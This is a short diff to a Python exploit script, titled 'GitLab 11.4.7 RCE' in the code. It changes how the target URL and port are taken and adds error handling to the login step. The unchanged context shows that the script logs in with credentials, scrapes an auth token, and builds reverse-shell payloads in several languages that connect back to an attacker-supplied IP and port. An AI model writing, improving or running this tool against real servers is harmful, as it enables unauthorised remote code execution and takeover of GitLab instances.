@@ -20,7 +20,7 @@ import re
 parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE', formatter_class=RawTextHelpFormatter)
 parser.add_argument('-u', help='GitLab Username/Email', required=True)
 parser.add_argument('-p', help='Gitlab Password', required=True)
-parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
+parser.add_argument('-g', help='Gitlab URL with port http://127.0.0.1:5080', required=True)
 parser.add_argument('-l', help='Reverse shell ip', required=True)
 parser.add_argument('-P', help='Reverse shell port', required=True)
 parser.add_argument('L', metavar='lang', nargs='?', help='Language for the reverse shell. Default nc_e\nSupported: nc_e, bash, perl, python3, ruby, php')
@@ -28,7 +28,7 @@ args = parser.parse_args()
 
 user = args.u
 pwd = args.p
-url = args.g + ":5080"
+url = args.g
 local_ip = args.l
 local_port = args.P
 shell_lang = ('nc_e' if args.L == None else args.L)
@@ -102,7 +102,13 @@ def get_payload(language):
 
 request = requests.Session()
 url_login = url + '/users/sign_in'
-login_page = request.get(url_login)
+try:
+    login_page = request.get(url_login)
+except Exception as e:
+    exit(f"Error accessing {url_login}")
+
+if login_page.status_code != 200:
+    exit(f"[-] GitLab error: {login_page.status_code}")
 
 auth_token = re.findall(auth_token_regex, login_page.text)[0]
 
